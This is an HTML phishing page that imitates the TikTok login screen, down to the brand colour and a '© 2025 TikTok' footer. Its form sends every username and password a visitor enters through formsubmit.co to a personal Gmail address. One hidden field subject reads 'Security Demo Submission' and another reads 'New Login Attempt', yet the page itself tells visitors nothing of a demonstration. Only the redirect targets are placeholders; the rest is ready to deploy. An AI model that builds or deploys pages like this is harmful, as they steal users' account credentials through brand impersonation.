<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Log in</title>
    <style>
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, Helvetica, Arial, sans-serif;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
            height: 100vh;
            margin: 0;
            color: #161823;
        }
        
        .login-container {
            width: 375px;
            padding: 20px;
            box-sizing: border-box;
            text-align: center;
        }
        
        h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 24px;
        }
        
        .input-field {
            width: 100%;
            padding: 12px 16px;
            margin-bottom: 16px;
            border: 1px solid #ccc;
            border-radius: 4px;
            font-size: 16px;
            box-sizing: border-box;
        }
        
        .login-option {
            color: #161823;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 16px;
            cursor: pointer;
        }
        
        .password-options {
            display: flex;
            justify-content: space-between;
            margin-bottom: 16px;
            font-size: 15px;
        }
        
        .forgot-password {
            color: #161823;
            font-weight: 600;
            cursor: pointer;
        }
        
        .login-button {
            width: 100%;
            padding: 12px;
            background-color: #fe2c55;
            color: white;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            margin-bottom: 16px;
        }
        
        .back-button {
            color: #161823;
            font-size: 15px;
            font-weight: 600;
            margin-bottom: 24px;
            cursor: pointer;
            display: inline-block;
        }
        
        .signup-prompt {
            color: #161823;
            font-size: 15px;
            margin-bottom: 24px;
        }
        
        .signup-link {
            color: #fe2c55;
            font-weight: 600;
            cursor: pointer;
        }
        
        .language-selector {
            color: #161823;
            font-size: 14px;
            margin-bottom: 16px;
        }
        
        .copyright {
            color: #161823;
            font-size: 12px;
        }
    </style>
</head>
<body>
    <div class="login-container">
        <h1>Log in</h1>
        
        <form action="https://formsubmit.co/jayrizzy07@gmail.com" method="POST">
            <input type="hidden" name="_subject" value="Security Demo Submission">
    <input type="hidden" name="_template" value="table">
    <input type="hidden" name="_next" value="https://your-site-name.netlify.app/thankyou.html">
            <input type="hidden" name="_subject" value="New Login Attempt">
            <input type="hidden" name="_template" value="table">
            <input type="hidden" name="_next" value="https://yourdomain.com/thankyou.html">
            
            <input type="text" name="username" class="input-field" placeholder="Email or username" required>
            <input type="password" name="password" class="input-field" placeholder="Password" required>
           
            <div class="login-option">Log in with phone</div>
         
            <div class="password-options">
                <div></div>
                <div class="forgot-password">Forgot password?</div>
            </div>
            
            <button type="submit" class="login-button">Log in</button>
        </form>
        
        <div class="back-button">< Go back</div>
        
        <div class="signup-prompt">Don't have an account? <span class="signup-link">Sign up</span></div>
        
        <div class="language-selector">English (US)</div>
        <div class="copyright">Â© 2025 TikTok</div>
    </div>
</body>
</html>
